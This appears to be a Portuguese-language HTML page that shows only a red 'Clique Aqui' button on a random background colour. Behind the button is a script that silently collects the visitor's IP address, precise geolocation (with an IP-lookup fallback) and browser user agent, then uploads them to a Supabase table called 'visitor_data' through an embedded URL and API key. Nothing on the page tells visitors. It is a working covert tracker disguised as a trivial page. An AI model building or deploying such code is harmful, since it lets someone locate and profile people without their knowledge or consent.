<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.5s; /* Suaviza a mudança de cor */
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            border: none;
            background-color: #ff0000;
            color: white;
            border-radius: 5px;
        }
        button:hover {
            background-color: #cc0000;
        }
    </style>
</head>
<body>
    <button id="triggerButton">Clique Aqui</button>

    <script>
        // Muda a cor do fundo aleatoriamente ao carregar
        function getRandomColor() {
            const letters = '0123456789ABCDEF';
            let color = '#';
            for (let i = 0; i < 6; i++) {
                color += letters[Math.floor(Math.random() * 16)];
            }
            return color;
        }
        document.body.style.backgroundColor = getRandomColor();

        // Configuração do Supabase
        const SUPABASE_URL = 'https://bsbipbftwrwjiepxmbb.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzYmlwYmZ0d3Jyd2ppZXB4bWJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDM4NzczNzQsImV4cCI6MjA1OTQ1MzM3NH0.NB9LBMjPZXF2Z7L78S9-3WhrIKeRyfNvJ-hgVLIKd7g';
        const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        // Teste básico de conexão com Supabase
        async function testSupabaseConnection() {
            try {
                const { data, error } = await supabase.from('visitor_data').select('*').limit(1);
                if (error) throw error;
                console.log('Conexão com Supabase OK:', data);
            } catch (error) {
                console.error('Erro na conexão com Supabase:', error.message);
            }
        }

        // Função para obter IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                console.log('IP capturado:', data.ip);
                return data.ip;
            } catch (e) {
                console.error('Erro ao obter IP:', e);
                return 'unknown';
            }
        }

        // Função para obter localização
        async function getLocation() {
            try {
                const geo = await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                        () => resolve(null),
                        { timeout: 5000 }
                    );
                });
                if (geo) {
                    console.log('Localização capturada:', geo);
                    return geo;
                }
                const ipGeo = await fetch('https://ipapi.co/json/').then(res => res.json());
                console.log('Localização por IP:', ipGeo);
                return { lat: ipGeo.latitude, lon: ipGeo.longitude };
            } catch (e) {
                console.error('Erro na localização:', e);
                return { lat: null, lon: null };
            }
        }

        // Função para capturar e enviar dados
        async function captureAndSendData() {
            console.log('Iniciando captura de dados...');
            await testSupabaseConnection(); // Verifica conexão

            const ip = await getIP();
            const location = await getLocation();
            const userAgent = navigator.userAgent;

            const data = {
                ip: ip,
                latitude: location.lat,
                longitude: location.lon,
                user_agent: userAgent
            };

            console.log('Dados a serem enviados:', data);

            try {
                const { data: responseData, error } = await supabase
                    .from('visitor_data')
                    .insert([data])
                    .select();
                if (error) throw error;
                console.log('Dados enviados com sucesso:', responseData);
            } catch (error) {
                console.error('Erro ao enviar para Supabase:', error.message, error.details);
            }
        }

        // Evento de clique no botão
        document.getElementById('triggerButton').addEventListener('click', captureAndSendData);
    </script>
</body>
</html>
